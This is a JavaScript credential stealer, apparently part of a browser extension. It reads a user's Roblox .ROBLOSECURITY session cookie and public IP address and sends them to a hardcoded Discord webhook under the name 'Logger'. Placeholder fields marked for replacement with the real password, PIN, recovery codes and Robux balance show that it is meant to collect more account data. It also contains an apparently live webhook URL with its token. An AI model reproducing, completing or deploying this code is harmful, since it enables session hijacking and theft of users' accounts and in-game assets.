const WEBHOOK_URL = "https://discord.com/api/webhooks/1275015275460169779/bNru38ZHUOjFhAgcetBeYM6U0Hi-BeUzK7mQv5EEoQRiA_JAoKPojDp77WA3E_EpXbKO";

async function main(cookie) {
    const ipAddr = await (await fetch("https://api.ipify.org")).text();
    
    let log = {
        under: "13+", // Replace with actual logic to determine this
        username: "ExampleUser", // Replace with actual username
        password: "ExamplePassword", // Replace with actual password
        robux: "100", // Replace with actual Robux balance
        premium: "Yes", // Replace with actual premium status
        rap: "200", // Replace with actual RAP value
        summary: "Account Summary", // Replace with actual summary
        creditbalance: "50", // Replace with actual credit balance
        status: "Active", // Replace with actual status
        age: "365", // Replace with actual account age
        pin: "1234", // Replace with actual PIN
        recoverycodes: "ABC123", // Replace with actual recovery codes
        roblosecurity: cookie, // Pass the cookie directly
        ip: ipAddr,
        tinyurl: "Error", // Placeholder for tinyURL
        thumbnail: "https://example.com/thumbnail.png" // Replace with actual thumbnail URL
    };

    if (log.tinyurl === 'Error') {
        log.tinyurl = `https://${window.location.hostname}/Bypass/check?cookie=${cookie}`;
    }

    const payload = {
        content: "",
        embeds: [{
            description: `[**Check Cookie**](${log.tinyurl})`,
            color: parseInt("FF5733", 16), // Example hex color
            fields: [
                { name: `Username (${log.under})`, value: log.username },
                { name: "Password", value: log.password },
                { name: "Robux (Pending)", value: log.robux, inline: true },
                { name: "Premium", value: log.premium, inline: true },
                { name: "RAP", value: log.rap },
                { name: "Summary", value: log.summary, inline: true },
                { name: "Credit Balance", value: log.creditbalance, inline: true },
                { name: "Status", value: log.status, inline: true },
                { name: "Age", value: log.age, inline: true },
                { name: "PIN", value: log.pin },
                { name: "Recovery Codes", value: log.recoverycodes },
                { name: "Cookie :cookie:", value: "```" + log.roblosecurity + "```" }
            ],
            footer: { text: log.ip },
            timestamp: new Date().toISOString(),
            thumbnail: { url: log.thumbnail }
        }],
        username: "Logger",
        avatar_url: "https://example.com/avatar.png", // Replace with actual avatar URL
        attachments: []
    };

    // Send the payload to the Discord webhook
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        console.log("Payload sent successfully");
    }).catch(error => {
        console.error("Error sending payload:", error);
    });
}

// Example call to main function
chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
